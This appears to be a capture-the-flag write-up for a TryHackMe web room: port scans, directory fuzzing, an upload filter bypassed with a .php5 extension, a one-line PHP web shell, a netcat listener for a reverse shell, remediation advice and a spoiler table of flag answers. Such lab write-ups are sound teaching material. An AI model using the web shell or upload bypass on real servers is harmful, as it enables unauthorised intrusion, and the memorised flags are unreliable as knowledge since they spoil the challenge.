> **Lab:** TryHackMe — Agent T  
> **Link**: https://tryhackme.com/room/rrootme
> **Local host:** `192.168.133.108`  
> **Target:** 10.49.182.219
> **Scope:** Port scanning, service enumeration, HTTP directory discovery, PHP file upload testing, remote code execution (RCE), reverse shell access, and user flag discovery.
## Table of Content
```table-of-contents
```
---
## 1. Port scanning and service enumeration
### 1.1 Port Scanning

To maps the external attack surface, a fast port scan was executed utilizing `RustScan`:

```bash
rustscan -a 10.49.182.219 -b 1000 --timeout 1500 -- -n -Pn
```

![Pasted image 20261018195139](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018195139.png)

> **Open Ports**
> - **Port 22**
> - **Port 80** 
### 1.2 Service Fingerprinting

An aggressive `Nmap` scan was executed against the identified ports to determine the exact service versions and run default NSE scripts:

```bash
sudo nmap -Pn -sV -sC -O -p 22,80 10.49.182.219
```

![Pasted image 20261018195314](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018195314.png)

> **Service**
> - **Port 22:** Running OpenSSH (standard Linux remote management).
> - **Port 80:** Running an Apache web server instance.

To further verify the web server's responses and headers, `httpx` was deployed:

```bash
httpx http://10.49.182.219
```

![Pasted image 20261018195516](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018195516.png)

### 1.3 Web Directory Discovery

Web directory brute-forcing was carried out using `FFUF` alongside a standard common wordlist to locate hidden admin portals or upload forms:

```bash
ffuf -u http://10.49.182.219/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301 -s
```

![Pasted image 20261018200403](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018200403.png)

The fuzzing process revealed several hidden directories.
## 2. Vulnerability Analysis & Exploitation
### 1.1 Unrestricted File Upload Testing

Inspection of the web application revealed an unauthenticated file upload feature.
![Pasted image 20261018200452](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018200452.png)

To test for file extension validation, a simple web shell snippet was compiled:

```bash
<?php system($_GET['cmd']); ?>
```

An initial upload attempt using the standard `.php` extension was rejected by the server block. However, bypassing the blacklist was achieved by changing the extension to `.php5`.

![Pasted image 20261018200902](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018200902.png)

![Pasted image 20261018201541](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018201541.png)

![Pasted image 20261018201037](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018201037.png)

The web application accepted the `.php5` file and made it accessible via one of the enumerated hidden directories, confirming **Arbitrary Code Execution**.

![Pasted image 20261018201120](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018201120.png)

![Pasted image 20261018201201](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018201201.png)
### 2.2 Establishing a Reverse Shell

Running commands through the uploaded PHP file is useful, but having an interactive shell would make further enumeration much easier.

Let's switch to a PHP reverse shell script by Ivan Sincek.

I'll configure it to connect back to my local machine at `192.168.133.108` on port `4444`.

```bash
nc -lvnp 4444
```

A robust PHP reverse shell script was uploaded to the server to establish a persistent connection back to the host machine.

There are many script that work for this, but I choose Ivan Sincek script with the help of Reverse Shell Generator: https://www.revshells.com/

Upon executing the payload via the browser, a connection was established on the Netcat listener, granting interactive shell access.

![Pasted image 20261018202656](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018202656.png)

## 3. Post-Exploitation & Data Discovery

With shell access established, a global search was conducted to locate high-value target assets (`user.txt`):

```bash
find / -name "user.txt" 2>/dev/null 
```

The system located the file path, allowing for successful data exfiltration.

![Pasted image 20261018202852](Image/Tryhackme%20-%20RootMe/Pasted%20image%2020261018202852.png)
## 5. Defensive Remediation & Mitigations

> **Info**
> To secure the asset against the specific vectors exploited in this assessment, the following remediation steps are recommended:
> 
> - **Enforce Strict File Validation:** Implement a rigid file type whitelist (rather than a extension blacklist) that strictly accepts only required file formats (e.g., `.png`, `.jpg`).
> - **Disable Execution inside Upload Directories:** Configure the web server architecture (via `.htaccess` or server blocks) to explicitly deny execution permissions (`X`) within any directories used to store user-uploaded content.
> - **Implement Input Sanitization:** Ensure the server renames uploaded files automatically utilizing a randomized hash scheme to mitigate path predictable and direct payload execution.
## 4. Challenge Answer

<details>
<summary>Spoiler Warning!</summary>


| Question                                                                     | Answer                    |
| ---------------------------------------------------------------------------- | ------------------------- |
| Scan the machine, how many ports are open?                                   | 2                         |
| What version of Apache is running?                                           | 2.4.41                    |
| What service is running on port 22?                                          | ssh                       |
| What is the hidden directory?                                                | /panel/                   |
| Find a form to upload and get a reverse shell, and find the flag. (user.txt) | THM{y0u_g0t_a_sh3ll}      |
| Search for files with SUID permission, which file is weird?                  | /usr/bin/python           |
| root.txt                                                                     | THM{pr1v1l3g3_3sc4l4t10n} |

</details>
